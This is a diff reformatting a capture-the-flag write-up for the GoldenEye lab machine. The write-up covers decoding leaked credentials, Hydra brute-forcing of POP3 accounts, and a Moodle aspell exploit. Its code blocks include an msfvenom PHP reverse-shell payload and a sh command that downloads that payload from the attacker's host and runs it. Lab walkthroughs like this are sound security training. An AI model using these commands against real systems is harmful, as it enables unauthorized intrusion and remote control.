@@ -17,7 +17,9 @@ Before doing that, I spidered spidering the page starting off at index.html and 
 
 The source of terminal.js exposes credentials for a user named Boris. These have a strange encoding that’s difficult to Google for since the search feature will filter ampersands and hash symbols, so I searched for “ampersand hash encoding”. The results indicated the associated password is encoded as semi-colon delimited HTML entities. We convert them into ASCII and get the credentials for user Boris with the following Python 2 one-liner which leverages the stdlib:
 
-`python -c 'import HTMLParser;h=HTMLParser.HTMLParser();s= h.unescape("&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;");print s'`
+```
+python -c 'import HTMLParser;h=HTMLParser.HTMLParser();s= h.unescape("&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;");print s'
+```
 
 We use the credentials to login to /sev-home/ and look at the source of the landing page. There is a spiel in the comments about approved “operators”; in addition to mentioning Boris, it gives us another username, Natalya. This comment is easily missed if you're not paying attention and are fooled by the slick whitespace after line 24.
 
@@ -30,11 +32,14 @@ I failed to find additional interesting pages after additional spidering and bru
 Firstly I used the VRFY command on the SMTP server to verify usernames Boris and Natalya were known to the mail server, which they were. I then tried to bruteforce both of their accounts on the pop3 service listening on port 55007 using a wordlist i constructed with cewl, as well as some Kali wordlists.
 
 Spidering and scraping with cewl
-`cewl http://172.16.2.33/sev-home/ --auth_user=boris --auth_pass=InvincibleHack3r --auth_type=basic > /tmp/Goldeneye-WL.txt`
+```
+cewl http://172.16.2.33/sev-home/ --auth_user=boris --auth_pass=InvincibleHack3r --auth_type=basic > /tmp/Goldeneye-WL.txt
+```
 
 Attacking with Hydra
-`hydra -e nsr 172.16.2.33 pop3 -l natalya -P /usr/share/wordlists/fasttrack.txt  -s 55007 -V
-hydra -e nsr 172.16.2.33 pop3 -l boris -P /usr/share/wordlists/fasttrack.txt  -s 55007 -V`
+```hydra -e nsr 172.16.2.33 pop3 -l natalya -P /usr/share/wordlists/fasttrack.txt  -s 55007 -V```
+
+```hydra -e nsr 172.16.2.33 pop3 -l boris -P /usr/share/wordlists/fasttrack.txt  -s 55007 -V```
 
 The fasttrack.txt list (not the one generated with Cewl) was sufficient to crack both users mail accounts. 
 
@@ -51,7 +56,9 @@ It turns out the subdirectories would only be accessible if we accessed them by 
 
 This application hosted here is called Moodle and appears to be an education content management system. This application exposed a login form which accepted the newly found credentials for xenia. I clicked through each area of the application, checking for interesting information and using OWASP ZAP and it’s proxy to map things out. ZAP has a feature that allows using regex to search through HTTP responses, so I used the regex 
 
-`(/\*([^*]|[\r\n]|(\*+([^*/]|[\r\n])))*\*+/|(?=<!--)([\s\S]*?)-->)`
+```
+(/\*([^*]|[\r\n]|(\*+([^*/]|[\r\n])))*\*+/|(?=<!--)([\s\S]*?)-->)
+```
 
 to search for additional comments.
 
@@ -59,7 +66,9 @@ to search for additional comments.
 
 
 In addition to comments, emails can be searched for with the following very hackish PCRE regex
-`(\d@|\w@)` or a more proper PCRE regex `[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}` 
+```
+(\d@|\w@)` or a more proper PCRE regex `[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}
+``` 
 
 The above don’t turn up anything of use. 
 
@@ -104,11 +113,15 @@ I attempted to fire off this MSF exploit, and the exploit ran but failed to gene
 
 I had been confused earlier as the exploits noted appeared to target **aspell**, while the tinyMCE editor only had PSpell listed as an available plugin on its Moodle configuration page. However a quick Google search showed that PSpell was dependent on aspell installations, so I surmised this dependency could trigger the vulnerability. First I created my payload: 
 
-`sudo msfvenom -p php/reverse_perl lhost=172.16.2.2 lport=443 -f raw -o /var/www/html/phprev443perl.php`
+```
+sudo msfvenom -p php/reverse_perl lhost=172.16.2.2 lport=443 -f raw -o /var/www/html/phprev443perl.php
+```
 
 I then manually edited the sh command that was originally meant to trigger the spell checker to read:
 
-`sh -c '(wget 172.16.2.2/phprev443perl.php -O/tmp/phprev443perl.php && php /tmp/phprev443perl.php)'`
+```
+sh -c '(wget 172.16.2.2/phprev443perl.php -O/tmp/phprev443perl.php && php /tmp/phprev443perl.php)'
+```
 
 After setting up my listener, I then navigated to a page that had a text editor running, and looked for the spellcheck option.
 ![spellcheck](https://user-images.githubusercontent.com/15524701/43056874-5fec938a-8e04-11e8-900c-2038c113d74d.jpeg)
